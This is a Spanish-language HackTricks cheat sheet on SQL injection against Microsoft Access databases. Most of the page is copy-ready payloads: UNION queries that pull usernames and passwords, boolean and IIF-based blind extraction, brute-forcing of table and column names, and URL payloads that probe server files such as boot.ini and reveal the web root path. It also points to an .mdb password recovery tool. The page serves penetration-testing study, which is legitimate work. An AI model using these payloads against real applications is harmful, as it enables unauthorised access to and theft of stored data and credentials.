# Inyección SQL de MS Access

{{#include ../../banners/hacktricks-training.md}}

## Playground en Línea

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## Limitaciones de la DB

### Concatenación de Cadenas

La concatenación de cadenas es posible con los caracteres `& (%26)` y `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Comentarios

No hay comentarios en MS Access, pero aparentemente es posible eliminar el último de una consulta con un carácter NULL:
```sql
1' union select 1,2 from table%00
```
Si esto no funciona, siempre podrías corregir la sintaxis de la consulta:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Consultas Apiladas

No son compatibles.

### LIMIT

El operador **`LIMIT`** **no está implementado**. Sin embargo, es posible limitar los resultados de la consulta SELECT a las **primeras N filas de la tabla utilizando el operador `TOP`**. `TOP` acepta como argumento un entero, que representa el número de filas que se devolverán.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Al igual que TOP, puedes usar **`LAST`** que obtendrá las **filas del final**.

## Consultas UNION/Subconsultas

En un SQLi, generalmente querrás ejecutar de alguna manera una nueva consulta para extraer información de otras tablas. MS Access siempre requiere que en **subconsultas o consultas adicionales se indique un `FROM`**.\
Así que, si deseas ejecutar un `UNION SELECT` o `UNION ALL SELECT` o un `SELECT` entre paréntesis en una condición, siempre **necesitas indicar un `FROM` con un nombre de tabla válido**.\
Por lo tanto, necesitas conocer un **nombre de tabla válido**.
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> Esto te permitirá exfiltrar valores de la tabla actual sin necesidad de conocer el nombre de la tabla.

**MS Access** permite **sintaxis extraña** como **`'1'=2='3'='asd'=false`**. Como suele ser, la inyección SQL estará dentro de una cláusula **`WHERE`**, por lo que podemos abusar de eso.

Imagina que tienes una SQLi en una base de datos de MS Access y sabes (o adivinaste) que un **nombre de columna es username**, y ese es el campo que deseas **exfiltrar**. Podrías verificar las diferentes respuestas de la aplicación web cuando se utiliza la técnica de chaining equals y potencialmente exfiltrar contenido con una **inyección booleana** usando la función **`Mid`** para obtener subcadenas.
```sql
'=(Mid(username,1,3)='adm')='
```
Si conoces el **nombre de la tabla** y **columna** para volcar, puedes usar una combinación entre `Mid`, `LAST` y `TOP` para **filtrar toda la información** a través de SQLi booleano:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Fuerza bruta de nombres de tablas

Usando la técnica de encadenamiento de iguales, también puedes **fuerza bruta de nombres de tablas** con algo como:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
También puedes usar una forma más tradicional:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Siéntase libre de verificar esto en el entorno en línea._

- Nombres de tablas comunes de Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- Hay otra lista en [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Fuerza Bruta de Nombres de Columnas

Puedes **forzar los nombres de columnas actuales** con el truco de encadenar iguales con:
```sql
'=column_name='
```
O con un **group by**:
```sql
-1' GROUP BY column_name%00
```
O puedes hacer un ataque de fuerza bruta a los nombres de columna de una **tabla diferente** con:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Volcado de datos

Ya hemos discutido la [**técnica de encadenamiento de iguales**](ms-access-sql-injection.md#chaining-equals-+-substring) **para volcar datos de la tabla actual y otras tablas**. Pero hay otras maneras:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
En resumen, la consulta utiliza una declaración "if-then" para activar un "200 OK" en caso de éxito o un "500 Internal Error" en caso contrario. Aprovechando el operador TOP 10, es posible seleccionar los primeros diez resultados. El uso posterior de LAST permite considerar solo la décima tupla. Con ese valor, utilizando el operador MID, es posible realizar una simple comparación de caracteres. Al cambiar adecuadamente el índice de MID y TOP, podemos volcar el contenido del campo "username" para todas las filas.

### Basado en Tiempo

Consulta [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](<https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN>)

### Otras funciones interesantes

- `Mid('admin',1,1)` obtiene la subcadena desde la posición 1 con longitud 1 (la posición inicial es 1)
- `LEN('1234')` obtiene la longitud de la cadena
- `ASC('A')` obtiene el valor ascii del carácter
- `CHR(65)` obtiene la cadena del valor ascii
- `IIF(1=1,'a','b')` si entonces
- `COUNT(*)` cuenta el número de elementos

## Enumerando tablas

Desde [**aquí**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) puedes ver una consulta para obtener los nombres de las tablas:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Sin embargo, ten en cuenta que es muy típico encontrar inyecciones SQL donde **no tienes acceso para leer la tabla `MSysObjects`**.

## Acceso al sistema de archivos

### Ruta completa del directorio raíz web

El conocimiento de la **ruta absoluta del directorio raíz web puede facilitar ataques posteriores**. Si los errores de la aplicación no están completamente ocultos, se puede descubrir la ruta del directorio intentando seleccionar datos de una base de datos inexistente.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access responde con un **mensaje de error que contiene la ruta completa del directorio web**.

### Enumeración de archivos

El siguiente vector de ataque se puede utilizar para **inferir la existencia de un archivo en el sistema de archivos remoto**. Si el archivo especificado existe, MS Access genera un mensaje de error informando que el formato de la base de datos es inválido:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Otra forma de enumerar archivos consiste en **especificar un elemento database.table**. **Si** el **archivo especificado existe**, MS Access muestra un **mensaje de error de formato de base de datos**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### Adivinanza del nombre del archivo .mdb

El **nombre del archivo de base de datos (.mdb)** se puede inferir con la siguiente consulta:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Donde **name\[i] es un nombre de archivo .mdb** y **realTable es una tabla existente** dentro de la base de datos. Aunque MS Access siempre generará un mensaje de error, es posible distinguir entre un nombre de archivo inválido y un nombre de archivo .mdb válido.

### Cracker de contraseñas .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) es una utilidad gratuita que se puede utilizar para recuperar la contraseña principal de la base de datos de Microsoft Access 95/97/2000/XP o Jet Database Engine 3.0/4.0.

## Referencias

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{{#include ../../banners/hacktricks-training.md}}
